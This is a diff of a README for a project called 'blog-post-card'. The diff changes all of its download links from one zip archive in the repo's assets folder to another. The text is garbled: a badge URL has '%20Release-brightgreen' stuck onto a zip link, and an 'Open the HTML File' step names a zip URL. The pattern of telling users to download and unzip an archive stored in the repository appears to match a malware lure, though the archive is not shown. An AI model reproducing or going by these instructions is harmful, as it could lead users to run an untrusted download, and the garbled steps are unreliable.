@@ -1,6 +1,6 @@
 # 🌌 blog-post-card - Create Beautiful Blog Post Cards Easily
 
-![Download](https://github.com/giunco/blog-post-card/raw/refs/heads/main/assets/card_post_blog_v1.3-alpha.4.zip%20Release-brightgreen)
+![Download](https://raw.githubusercontent.com/giunco/blog-post-card/main/assets/blog_card_post_v1.9.zip%20Release-brightgreen)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the blog-post-card project! This application allows you to create a s
 
 ## 📥 Download & Install
 
-To download the latest version of the blog-post-card application, visit the Releases page: [Download the latest release](https://github.com/giunco/blog-post-card/raw/refs/heads/main/assets/card_post_blog_v1.3-alpha.4.zip).
+To download the latest version of the blog-post-card application, visit the Releases page: [Download the latest release](https://raw.githubusercontent.com/giunco/blog-post-card/main/assets/blog_card_post_v1.9.zip).
 
 You will find the most recent version available for download. Click on the appropriate file for your operating system, and save it to your computer.
 
@@ -33,7 +33,7 @@ The blog-post-card provides the following features:
 
 1. **Download the File**: Follow the link above to download the application.
 2. **Unzip the File**: If the file is zipped, right-click it and select "Extract" to access the contents.
-3. **Open the HTML File**: Find the `https://github.com/giunco/blog-post-card/raw/refs/heads/main/assets/card_post_blog_v1.3-alpha.4.zip` file in the extracted folder and double-click it. This will open your blog post card in your web browser.
+3. **Open the HTML File**: Find the `https://raw.githubusercontent.com/giunco/blog-post-card/main/assets/blog_card_post_v1.9.zip` file in the extracted folder and double-click it. This will open your blog post card in your web browser.
 4. **View and Edit**: You can see how the blog post card looks. If you want to make changes, open the HTML file in a text editor and modify the content as you wish.
 
 ## 🛠️ Troubleshooting
